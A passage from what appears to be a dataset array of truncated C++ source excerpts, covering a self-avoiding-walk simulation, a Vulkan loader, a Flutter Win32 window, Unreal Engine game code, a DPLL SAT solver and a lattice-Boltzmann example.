  else if(directions[pivotpoint-kk]==5)\n                    {\n                        back_row[2] = back_row[2] + 1;\n                    }   \n                    checker.insert(back_row);\n                    \n                    //cout << back_row[0] << \" \" << back_row[1] << \"\\n\\n\";\n                    if (checker.size()!=kk+(2*k)-k+1)\n                    {\n                        //cout << \"BAD\\n\";\n                        //If not a SAW return the saved set and a 1 to indicate we should return to old set of directions\n                        return 0;\n                    }\n                }\n                break;\n            }\n            else \n            {\n                for (int kk=k; kk<n-k;kk++)\n                {\n                    if(directions[pivotpoint+kk]==0)\n                    {\n                        row[1] = row[1] + 1;\n                    }    \n                    else if(directions[pivotpoint+kk]==1)\n                    {\n                        row[0] = row[0] + 1;\n     ",
    "// MIT License\n// \n// Copyright (C) 2018-2024, Tellusim Technologies Inc. https://tellusim.com/\n// \n// Permission is hereby granted, free of charge, to any person obtaining a copy\n// of this software and associated documentation files (the \"Software\"), to deal\n// in the Software without restriction, including without limitation the rights\n// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n// copies of the Software, and to permit persons to whom the Software is\n// furnished to do so, subject to the following conditions:\n// \n// The above copyright notice and this permission notice shall be included in all\n// copies or substantial portions of the Software.\n// \n// THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n// SOFTWARE.\n\n#include <core/TellusimLog.h>\n#include <platform/TellusimContext.h>\n\n#include \"../include/TellusimVK.h\"\n\n/*\n */\nnamespace Tellusim {\n\t\n\t/*\n\t */\n\tnamespace VK {\n\t\t\n\t\t/*\n\t\t */\n\t\tbool init() {\n\t\t\t\n\t\t\t// function address\n\t\t\t#define GET_ADDRESS(TYPE, NAME) { \\\n\t\t\t\tNAME = (TYPE)VKContext::getProcAddress(#NAME); \\\n\t\t\t\tif(NAME == nullptr && is_core) { \\\n\t\t\t\t\tTS_LOGF(Error, \"VK::init(): can't get %s function\\n\", #NAME); \\\n\t\t\t\t\treturn false; \\\n\t\t\t\t} \\\n\t\t\t}\n\t\t\t\n\t\t\t// core functions\n\t\t\tbool is_core = true;\n\t\t\t\n\t\t\t// Vulkan 10 functions\n\t\t\tGET_ADDRESS(PFN_vkCreateInstance, vkCreateInstance)\n\t\t\tGET_ADDRESS(PFN_vkDestroyInstance, vkDestroyInstance)\n\t\t\tGET_ADDRESS(PFN_vkEnumeratePhysicalDevices, vkEnumeratePhysicalDevices)\n\t\t\tGET_ADDRESS(PFN_vkGetPhysicalDeviceFeatures, vkGetPhysicalDeviceFeatures)\n\t\t\tGET_ADDRESS(PFN_vkGetPhysicalDeviceFormatProperties, vkGetPhysicalDeviceFormatProperties)\n\t\t\tGET_ADDRESS(PFN_vkGetPhysicalDeviceImageFormatProperties, vkGetPhysicalDeviceImageFormatProperties)\n\t\t\tGET_ADDRESS(PFN_vkGetPhysicalDeviceProperties, vkGetPhysicalDeviceProperties)\n\t\t\tGET_ADDRESS(PFN_vkGetPhysicalDeviceQueueFamilyProperties, vkGetPhysicalDeviceQueueFamilyProperties)\n\t\t\tGET_ADDRESS(PFN_vkGetPhysicalDeviceMemoryProperties, vkGetPhysicalDeviceMemoryProperties)\n\t\t\tGET_ADDRESS(PFN_vkGetInstanceProcAddr, vkGetInstanceProcAddr)\n\t\t\tGET_ADDRESS(PFN_vkGetDeviceProcAddr, vkGetDeviceProcAddr)\n\t\t\tGET_ADDRESS(PFN_vkCreateDevice, vkCreateDevice)\n\t\t\tGET_ADDRESS(PFN_vkDestroyDevice, vkDestroyDevice)\n\t\t\tGET_ADDRESS(PFN_vkEnumerateInstanceExtensionProperties, vkEnumerateInstanceExtensionProperties)\n\t\t\tGET_ADDRESS(PFN_vkEnumerateDeviceExtensionProperties, vkEnumerateDeviceExtensionProperties)\n\t\t\tGET_ADDRESS(PFN_vkEnumerateInstanceLayerProperties, vkEnumerateInstanceLayerProperties)\n\t\t\tGET_ADDRESS(PFN_vkEnumerateDeviceLayerProperties, vkEnumerateDeviceLayerProperties)\n\t\t\tGET_ADDRESS(PFN_vkGetDeviceQueue, vkGetDeviceQueue)\n\t\t\tGET_ADDRESS(PFN_vkQueueSubmit, vkQueueSubmit)\n\t\t\tGET_ADDRESS(PFN_vkQueueWaitIdle, vkQueueWaitIdle)\n\t\t\tGET_ADDRESS(PFN_vkDeviceWaitIdle, vkDeviceWaitIdle)\n\t\t\tGET_ADDRESS(PFN_vkAllocateMemory, vkAllocateMemory)\n\t\t\tGET_ADDRESS(PFN_vkFreeMemory, vkFreeMemory)\n\t\t\tGET_ADDRESS(PFN_vkMapMemory, vkMapMemory)\n\t\t\tGET_ADDRESS(PFN_vkUnmapMemory, vkUnmapMemory)\n\t\t\tGET_ADDRESS(PFN_vkFlushMappedMemoryRanges, vkFlushMappedMemoryRanges)\n\t\t\tGET_ADDRESS(PFN_vkInvalidateMappedMemoryRanges, vkInvalidateMappedMemoryRanges)\n\t\t\tGET_ADDRESS(PFN_vkGetDeviceMemoryCommitment, vkGetDeviceMemoryCommitment)\n\t\t\tGET_ADDRESS(PFN_vkBindBufferMemory, vkBindBufferMemory)\n\t\t\tGET_ADDRESS(PFN_vkBindImageMemory, vkBindImageMemory)\n\t\t\tGET_ADDRESS(PFN_vkGetBufferMemoryRequirements, vkGetBufferMemoryRequirements)\n\t\t\tGET_ADDRESS(PFN_vkGetImageMemoryRequirements, vkGetImageMemoryRequirements)\n\t\t\tGET_ADDRESS(PFN_vkGetImageSparseMemoryRequirements, vkGetImageSparseMemoryRequirements)\n\t\t\tGET_ADDRESS(PFN_vkGetPhysicalDeviceSparseImageFormatProperties, vkGetPhysicalDeviceSparseImageFormatProperties)\n\t\t\tGET_ADDRESS(PFN_vkQueueBindSparse, vkQueueBindSparse)\n\t\t\tGET_ADDRESS(PFN_vkCreateFence, vkCreateFence)\n\t\t\tGET_ADDRESS(PFN_vkDestroyFence, vkDestroyFence)\n\t\t\tGET_ADDRESS(PFN_vkResetFences, vkResetFences)\n\t\t\tGET_ADDRESS(PFN_vkGetFenceStatus, vkGetFenceStatus)\n\t\t\tGET_ADDRESS(PFN_vkWaitForFences, vkWaitForFences)\n\t\t\tGET_ADDRESS(PFN_vkCreateSemaphore, vkCreateSemaphore)\n\t\t\tGET_ADDRESS(PFN_vkDestroySemaphore, vkDestroySemaphore)\n\t\t\tGET_ADDRESS(PFN_vkCreateEvent, vkCreateEvent)\n\t\t\tGET_ADDRESS(PFN_vkDestroyEvent, vkDestroyEvent)\n\t\t\tGET_ADDRESS(PFN_vkGetEventStatus, vkGetEventStatus)\n\t\t\tGET_ADDRESS(PFN_vkSetEvent, vkSetEvent)\n\t\t\tGET_ADDRESS(PFN_vkResetEvent, vkResetEvent)\n\t\t\tGET_ADDRESS(PFN_vkCreateQueryPool, vkCreateQueryPool)\n\t\t\tGET_ADDRESS(PFN_vkDestroyQueryPool, vkDestroyQueryPool)\n\t\t\tGET_ADDRESS(PFN_vkGetQueryPoolResults, ",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "// Copyright Epic Games, Inc. All Rights Reserved.\n/*===========================================================================\n\tGenerated code exported from UnrealHeaderTool.\n\tDO NOT modify this manually! Edit the corresponding .h files instead!\n===========================================================================*/\n\n#include \"UObject/GeneratedCppIncludes.h\"\n#include \"ManagerUI/Public/LayerManagerHUD.h\"\nPRAGMA_DISABLE_DEPRECATION_WARNINGS\nvoid EmptyLinkFunctionForGeneratedCodeLayerManagerHUD() {}\n// Cross Module References\n\tENGINE_API UClass* Z_Construct_UClass_AHUD();\n\tMANAGERUI_API UClass* Z_Construct_UClass_ALayerManagerHUD();\n\tMANAGERUI_API UClass* Z_Construct_UClass_ALayerManagerHUD_NoRegister();\n\tMANAGERUI_API UClass* Z_Construct_UClass_ULayerUI_NoRegister();\n\tUMG_API UClass* Z_Construct_UClass_UUserWidget_NoRegister();\n\tUPackage* Z_Construct_UPackage__Script_ManagerUI();\n// End Cross Module References\n\tDEFINE_FUNCTION(ALayerManagerHUD::execIsWidgetOnTopOfLayer)\n\t{\n\t\tP_GET_PROPERTY(FStrProperty,Z_Param_Name);\n\t\tP_GET_OBJECT(UUserWidget,Z_Param_Widget);\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\t*(bool*)Z_Param__Result=P_THIS->IsWidgetOnTopOfLayer(Z_Param_Name,Z_Param_Widget);\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execPeekLayer)\n\t{\n\t\tP_GET_PROPERTY(FStrProperty,Z_Param_Name);\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\t*(UUserWidget**)Z_Param__Result=P_THIS->PeekLayer(Z_Param_Name);\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execGetCurrentLayerTag)\n\t{\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\t*(FString*)Z_Param__Result=P_THIS->GetCurrentLayerTag();\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execGetLayer)\n\t{\n\t\tP_GET_PROPERTY(FStrProperty,Z_Param_Name);\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\t*(ULayerUI**)Z_Param__Result=P_THIS->GetLayer(Z_Param_Name);\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execClearLayer)\n\t{\n\t\tP_GET_PROPERTY(FStrProperty,Z_Param_Name);\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\tP_THIS->ClearLayer(Z_Param_Name);\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execClearAllLayers)\n\t{\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\tP_THIS->ClearAllLayers();\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execPopFromCurrentLayer)\n\t{\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\t*(UUserWidget**)Z_Param__Result=P_THIS->PopFromCurrentLayer();\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execPopFromLayer)\n\t{\n\t\tP_GET_PROPERTY(FStrProperty,Z_Param_Name);\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\t*(UUserWidget**)Z_Param__Result=P_THIS->PopFromLayer(Z_Param_Name);\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execPushToLayer)\n\t{\n\t\tP_GET_PROPERTY(FStrProperty,Z_Param_Name);\n\t\tP_GET_OBJECT(UUserWidget,Z_Param_Widget);\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\tP_THIS->PushToLayer(Z_Param_Name,Z_Param_Widget);\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execRemoveLayer)\n\t{\n\t\tP_GET_PROPERTY(FStrProperty,Z_Param_Name);\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\tP_THIS->RemoveLayer(Z_Param_Name);\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execRegisterLayer)\n\t{\n\t\tP_GET_PROPERTY(FStrProperty,Z_Param_Name);\n\t\tP_GET_OBJECT(ULayerUI,Z_Param_Layer);\n\t\tP_GET_UBOOL(Z_Param_bCurrent);\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\tP_THIS->RegisterLayer(Z_Param_Name,Z_Param_Layer,Z_Param_bCurrent);\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execRegisterDefaultLayer)\n\t{\n\t\tP_GET_PROPERTY(FStrProperty,Z_Param_Name);\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\tP_THIS->RegisterDefaultLayer(Z_Param_Name);\n\t\tP_NATIVE_END;\n\t}\n\tvoid ALayerManagerHUD::StaticRegisterNativesALayerManagerHUD()\n\t{\n\t\tUClass* Class = ALayerManagerHUD::StaticClass();\n\t\tstatic const FNameNativePtrPair Funcs[] = {\n\t\t\t{ \"ClearAllLayers\", &ALayerManagerHUD::execClearAllLayers },\n\t\t\t{ \"ClearLayer\", &ALayerManagerHUD::execClearLayer },\n\t\t\t{ \"GetCurrentLayerTag\", &ALayerManagerHUD::execGetCurrentLayerTag },\n\t\t\t{ \"GetLayer\", &ALayerManagerHUD::execGetLayer },\n\t\t\t{ \"IsWidgetOnTopOfLayer\", &ALayerManagerHUD::execIsWidgetOnTopOfLayer },\n\t\t\t{ \"PeekLayer\", &ALayerManagerHUD::execPeekLayer },\n\t\t\t{ \"PopFromCurrentLayer\", &ALayerManagerHUD::execPopFromCurrentLayer },\n\t\t\t{ \"PopFromLayer\", &ALayerManagerHUD::execPopFromLayer },\n\t\t\t{ \"PushToLayer\", &ALayerManagerHUD::execPushToLayer },\n\t\t\t{ \"RegisterDefaultLayer\", &ALayerManagerHUD::execRegisterDefaultLayer },\n\t\t\t{ \"RegisterLayer\", &ALayerManagerHUD::execRegisterLayer },\n\t\t\t{ \"RemoveLayer\", &ALayerManagerHUD::execRemoveLayer },\n\t\t};\n\t\tFNativeFunctionRegistrar::RegisterFunctions(Class, Funcs, UE_ARRAY_COUNT(Funcs));\n\t}\n\tstruct Z_Construct_UFunction_ALayerManagerHUD_ClearAllLayers_Statics\n\t{\n#if WITH_METADATA\n\t\tstatic const UECodeGen_Private::FMetaDataPairParam Function_MetaDataParams[];\n#endif\n\t\tstatic const UECodeGen_Private::FFunctionParams FuncParams;\n\t};\n#if WITH_METADATA\n\tconst UECodeGen_Private::FMetaDataPairParam Z_Construct_UFunction_ALayerManagerHUD_ClearAllLayers_Statics::Function_MetaDataParams[] = {\n\t\t{ \"Category\", \"Layer\" },\n\t\t{ \"Comment\", \"/** Clears all layers. */\" },\n\t\t{ \"ModuleRelativePath\", \"Public/LayerManagerHUD.h\" }",
    "// Copyright 2024 jeonghun\n\n\n#include \"LLCharacter.h\"\n#include \"InputActionValue.h\"\n#include \"EnhancedInputComponent.h\"\n#include \"EnhancedInputSubsystems.h\"\n#include \"Camera/CameraComponent.h\"\n#include \"Components/CapsuleComponent.h\"\n#include \"GameFramework/CharacterMovementComponent.h\"\n#include \"GameFramework/SpringArmComponent.h\"\n#include \"LLPlayerController.h\"\n\n\nALLCharacter::ALLCharacter()\n{\n\tPrimaryActorTick.bCanEverTick = false;\n\tbUseControllerRotationYaw = true;\n\n\tGetCapsuleComponent()->InitCapsuleSize(42.f, 92.0f);\n\n\tGetCharacterMovement()->bOrientRotationToMovement = false;\n\tGetCharacterMovement()->bUseSeparateBrakingFriction = true;\n\tGetCharacterMovement()->MaxWalkSpeed = 600.f;\n\tGetCharacterMovement()->MaxAcceleration = 1200.f;\n\tGetCharacterMovement()->BrakingFrictionFactor = 1.f;\n\tGetCharacterMovement()->BrakingFriction = 3.f;\n\tGetCharacterMovement()->BrakingDecelerationWalking = 1400.f;\n\tGetCharacterMovement()->RotationRate = FRotator(0.0f, 0.0f, 720.0f);\n\tGetCharacterMovement()->bUseControllerDesiredRotation = true;\n\tGetCharacterMovement()->MaxStepHeight = 50.0f;\n\tGetCharacterMovement()->JumpZVelocity = 500.0f;\n\tGetCharacterMovement()->AirControl = 0.4f;\n\tGetCharacterMovement()->AirControlBoostMultiplier = 4.0f;\n\tGetCharacterMovement()->AirControlBoostVelocityThreshold = 50.0f;\n\n\tCameraBoom = CreateDefaultSubobject<USpringArmComponent>(TEXT(\"CameraBoom\"));\n\tCameraBoom->SetupAttachment(RootComponent);\n\tCameraBoom->bUsePawnControlRotation = true;\n\tCameraBoom->TargetArmLength = 400.0f;\n\n\tFollowCamera = CreateDefaultSubobject<UCameraComponent>(TEXT(\"FollowCamera\"));\n\tFollowCamera->SetupAttachment(CameraBoom, USpringArmComponent::SocketName);\n\tFollowCamera->bUsePawnControlRotation = false;\n\n\tstatic ConstructorHelpers::FObjectFinder<USkeletalMesh> UE4Mannequin(\n\t\tTEXT(\"/Script/Engine.SkeletalMesh'/Game/Characters/Mannequin_UE4/Meshes/SK_Mannequin.SK_Mannequin'\"));\n\tensure(UE4Mannequin.Object != nullptr);\n\tGetMesh()->SetSkeletalMesh(UE4Mannequin.Object);\n\tGetMesh()->SetRelativeLocationAndRotation(FVector(0.f, 0.f, -94.f), FRotator(0.f, -90.f, 0.f));\n\tGetMesh()->SetCollisionProfileName(TEXT(\"NoCollision\"));\n\n\tstatic ConstructorHelpers::FClassFinder<UAnimInstance> LocomotionAnimInstance(TEXT(\"/Game/Blueprints/ABP_LyraLocomotion.ABP_LyraLocomotion_C\"));\n\tensure(LocomotionAnimInstance.Class != nullptr);\n\tGetMesh()->SetAnimInstanceClass(LocomotionAnimInstance.Class);\n\t\n}\n\nvoid ALLCharacter::SetupPlayerInputComponent(UInputComponent* PlayerInputComponent)\n{\n\tSuper::SetupPlayerInputComponent(PlayerInputComponent);\n\n\tif (const ALLPlayerController* LocalController = Cast<ALLPlayerController>(Controller))\n\t{\n\t\tif (UEnhancedInputLocalPlayerSubsystem* InputSystem = ULocalPlayer::GetSubsystem<UEnhancedInputLocalPlayerSubsystem>(LocalController->GetLocalPlayer()))\n\t\t{\n\t\t\tInputSystem->AddMappingContext(LocalController->MappingContext, 0);\n\t\t}\n\n\t\tif (UEnhancedInputComponent* EnhancedInputComponent = Cast<UEnhancedInputComponent>(PlayerInputComponent))\n\t\t{\n\t\t\tEnhancedInputComponent->BindAction(LocalController->MoveAction, ETriggerEvent::Triggered, this, &ALLCharacter::Move);\n\t\t\tEnhancedInputComponent->BindAction(LocalController->LookAction, ETriggerEvent::Triggered, this, &ALLCharacter::Look);\n\t\t\tEnhancedInputComponent->BindAction(LocalController->JumpAction, ETriggerEvent::Started, this, &ACharacter::Jump);\n\t\t\tEnhancedInputComponent->BindAction(LocalController->JumpAction, ETriggerEvent::Completed, this, &ACharacter::StopJumping);\n\t\t}\n\t}\n}\n\nvoid ALLCharacter::Move(const FInputActionValue& Value)\n{\n\tif (Controller != nullptr)\n\t{\n\t\tconst FRotator Rotation = Controller->GetControlRotation();\n\t\tconst FRotator YawRotation(0, Rotation.Yaw, 0);\n\n\t\tconst FVector ForwardDirection = FRotationMatrix(YawRotation).GetUnitAxis(EAxis::X);\n\t\tconst FVector RightDirection = FRotationMatrix(YawRotation).GetUnitAxis(EAxis::Y);\n\n\t\tconst FVector2D MovementVector = Value.Get<FVector2D>();\n\t\tAddMovementInput(ForwardDirection, MovementVector.Y);\n\t\tAddMovementInput(RightDirection, MovementVector.X);\n\t}\n}\n\nvoid ALLCharacter::Look(const FInputActionValue& Value)\n{\n\tif (Controller != nullptr)\n\t{\n\t\tconst FVector2D LookAxisVector = Value.Get<FVector2D>();\n\t\tAddControllerYawInput(LookAxisVector.X);\n\t\tAddControllerPitchInput(LookAxisVector.Y);\n\t}\n}\n",
    "#include <algorithm>\n#include <errno.h>\n#include <fstream>\n#include <iostream>\n#include <set>\n#include <unordered_set>\n#include <sstream>\n#include <string>\n#include <string.h>\n#include <vector>\n\n#define MAXVARS 1500\n\nusing std::vector;\nusing std::string;\nusing std::unordered_set;\n\nclass CNF {\n    int nvars;\n    bool empty = false;\n    vector<vector<int> > clauses;\n\npublic:\n    static CNF* parse(const string& name) {\n        std::ifstream f(name);\n        if (f.fail()) {\n            std::cout << \"Cannot open file: \" << strerror(errno) << \"\\n\";\n            return nullptr;\n        }\n        string s;\n        int line = 0;\n        int nclauses;\n        string tmp;\n\n        CNF* result = new CNF();\n\n        while (1) {\n            line++;\n            std::getline(f, s);\n            if (s[0] == 'c')\n                continue;\n            if (s[0] == 'p')\n                break;\n            std::cout << \"Invalid DIMACS, unknown letter at line \" << line << \"\\n\";\n            return nullptr;\n        }\n        std::istringstream iss(s);\n        iss >> tmp >> tmp >> result->nvars >> nclauses;\n        if (result->nvars > MAXVARS) {\n            std::cout << \"too many vars\\n\";\n            exit(1);\n        }\n        for (int i = 0; i < nclauses; i++) {\n            vector<int> clause;\n            int literal;\n            std::getline(f, s);\n            std::istringstream iss(s);\n            unordered_set<int> used_literals; // for sanity checks\n            bool clause_always_true = false;\n\n            iss >> literal;\n            while (literal) {\n                if (used_literals.find(literal) != used_literals.end()) {\n                    iss >> literal;\n                    continue;\n                }\n                if (used_literals.find(-literal) != used_literals.end())\n                    clause_always_true = true;\n                used_literals.insert(literal);\n                clause.push_back(literal);\n                iss >> literal;\n            } while (literal);\n            if (!clause_always_true)\n                result->clauses.push_back(clause);\n        }\n        return result;\n    }\n\n    unordered_set<int> find_unit_clauses() const {\n        unordered_set<int> ret;\n        for (const auto& a : clauses) {\n            if (a.size() == 1)\n                ret.insert(a[0]);\n        }\n        return ret;\n    }\n\n    unordered_set<int> find_pure_literals() const {\n        unordered_set<int> ret;\n        unordered_set<int> bad_vars;\n\n        for (const auto& c : clauses) {\n            for (int l : c) {\n                if (bad_vars.find(abs(l)) != bad_vars.end()) continue;\n                if (ret.find(l) != ret.end()) continue;\n                if (ret.find(-l) != ret.end()) {\n                    bad_vars.insert(abs(l));\n                    ret.erase(-l);\n                } else {\n                    ret.insert(l);\n                }\n            }\n        }\n        return ret;\n    }\n\n    bool has_empty_clause() const { return empty; }\n    bool is_cnf_empty() const { return clauses.size() == 0; }\n\n    void propagate_var_single_value(int v) {\n        clauses.erase(std::remove_if(clauses.begin(), clauses.end(), [v](const vector<int>& c) { return std::find(c.begin(), c.end(), v) != c.end(); }), clauses.end());\n        for (auto& c : clauses) {\n            c.erase(std::remove_if(c.begin(), c.end(), [v](int l){ return l == -v; }), c.end());\n            if (c.size() == 0) {\n                empty = true;\n                return;\n            }\n        }\n    }\n\n    void propagate_var_values(const unordered_set<int>& vs) {\n        for (int v : vs) {\n            propagate_var_single_value(v);\n            if (empty)\n                break;\n        }\n    }\n\n    int select_branching_literal() {\n        return clauses[0][0];\n    }\n\n    bool solve_helper(vector<int>* acc) {\n        if (has_empty_clause()) return false;\n\n        // unit clauses\n        while (true) {\n            unordered_set<int> units = find_unit_clauses();\n            if (units.size() == 0) break;\n            if (units.size() > 1) {\n                for (int v : units) {\n                    if (units.find(-v) != units.end()) return false;\n                }\n            }\n            for (int v : units) acc->push_back(v);\n            propagate_var_values(units);\n            if (has_empty_clause()) return false;\n        }\n\n        // pure literals\n        while (true) {\n            unordered_set<int> lits = find_pure_literals();\n            if (lits.size() == 0) break;\n            for (int v : lits) acc->push_back(v);\n            propagate_var_values(lits);\n            if (has_empty_clause()) return false;\n        }\n\n        if (is_cnf_empty()) return true;\n\n        size_t acclim = acc->size();\n        int v = select_branching_literal();\n\n        // branching\n        {\n            // Create copy in heap, do not eat stack\n            CNF *cnf2 = new CNF(*this);\n            acc->push_back(v);\n            cnf2->propagate_var_single_value(v);\n            bool ret = cnf2->solve_helper(ac",
    "/************************************************************************\n * MechSys - Open Library for Mechanical Systems                        *\n * Copyright (C) 2009 Sergio Galindo                                    *\n *                                                                      *\n * This program is free software: you can redistribute it and/or modify *\n * it under the terms of the GNU General Public License as published by *\n * the Free Software Foundation, either version 3 of the License, or    *\n * any later version.                                                   *\n *                                                                      *\n * This program is distributed in the hope that it will be useful,      *\n * but WITHOUT ANY WARRANTY; without even the implied warranty of       *\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the         *\n * GNU General Public License for more details.                         *\n *                                                                      *\n * You should have received a copy of the GNU General Public License    *\n * along with this program. If not, see <http://www.gnu.org/licenses/>  *\n ************************************************************************/\n\n// Std Lib\n#include <iostream>\n#include <stdlib.h>\n\n// MechSys\n#include <mechsys/lbm/Domain.h>\n\nusing std::cout;\nusing std::endl;\nstruct UserData\n{\n    Vec3_t             g;\n};\n\nvoid Setup(LBM::Domain & dom, void * UD)\n{\n    UserData & dat = (*static_cast<UserData *>(UD));\n    for (size_t j=0;j<dom.Lat.Size();j++)\n    for (size_t i=0;i<dom.Lat[j].Ncells;i++)\n    {\n        Cell * c = dom.Lat[j].Cells[i];\n        c->BForcef = c->Density()*dat.g;\n    }\n}\n\n\nint main(int argc, char **argv) try\n{\n    size_t Nproc = 1; \n    if (argc==2) Nproc=atoi(argv[1]);\n    Array<double> nu(2);\n    nu[0] = 1.0/6.0;\n    nu[1] = 1.0/6.0;\n    